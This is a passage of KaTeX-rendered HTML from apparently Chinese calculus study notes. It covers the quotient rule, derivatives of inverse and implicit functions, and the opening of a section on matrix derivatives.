class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span></li><li>除法法则：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mo stretchy="false">(</mo><mfrac><mi>f</mi><mi>g</mi></mfrac><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mi>f</mi><mo>⋅</mo><mi>g</mi><mo>−</mo><mi>f</mi><mo>⋅</mo><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mi>g</mi></mrow><msup><mi>g</mi><mn>2</mn></msup></mfrac></mrow><annotation encoding="application/x-tex">\frac{d}{dx}(\frac{f}{g})=\frac{\frac{d}{dx}f\cdot g -f\cdot  \frac{d}{dx}g}{g^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4133239999999998em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322159999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.6479279999999998em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.16682em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5508em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8800285714285714em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span><span class="mbin mtight">⋅</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span><span class="mbin mtight">⋅</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8800285714285714em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li></ul><h4 id="反函数求导"><a class="markdownIt-Anchor" href="#反函数求导"></a> 反函数求导</h4><ul><li>如果<code>f,g</code>可微且互为反函数，而且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y=f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>，那么<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>g</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">g&#x27;(y)=\frac{1}{f&#x27;(x)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828285714285715em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">x</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li></ul><h4 id="隐函数求导"><a class="markdownIt-Anchor" href="#隐函数求导"></a> 隐函数求导</h4><ul><li>隐函数就是x,y的关系比较复杂，在不同域内有不同的函数关系，但整体的函数关系简单，这个时候就可以用隐函数求导。</li><li>如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>:</mo><msup><mi>R</mi><mn>2</mn></msup><mo>→</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">F(x,y):R^2\to R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span></span></span></span>是一个二元函数，而且：<ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">F(x_0,y_0)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></li><li>F在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>0</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_0,y_0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>附近连续可微</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>F</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi>y</mi></mrow></mfrac><mi mathvariant="normal">≠</mi><mn>0</mn></mrow><annotation encoding="application/x-tex">\frac{\partial F}{\partial y}\ne 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3612159999999998em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>0</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_0,y_0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>附近城里</li></ul></li><li>那么在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>0</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_0,y_0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>附近的一个领域内，存在唯一一个函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>，使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">F(x,f(x))=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，而且</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi>d</mi><mi>f</mi></mrow><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mo>=</mo><mo>−</mo><mfrac><mrow><msub><mi mathvariant="normal">∂</mi><mi>x</mi></msub><mi>F</mi></mrow><mrow><msub><mi mathvariant="normal">∂</mi><mi>y</mi></msub><mi>F</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{df}{dx}=-\frac{\partial_xF}{\partial_yF}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.0574399999999997em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714399999999998em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="mord mathdefault">x</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.343548em;vertical-align:-0.972108em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.972108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h4 id="矩阵求导"><a class="markdownIt-Anchor" href="#矩阵求导"></a> 矩阵求导</h4><ul><li><p>线性映射求导</p><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>y</mi><mo>⃗</mo></mover><mo>=</mo><mi>A</mi><mover accent="true"><mi>x</mi><mo>⃗</mo></mover></mrow><annotation encoding="application/x-tex">\vec{y}=A\vec{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9084399999999999em;vertical-align:-0.19444em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span 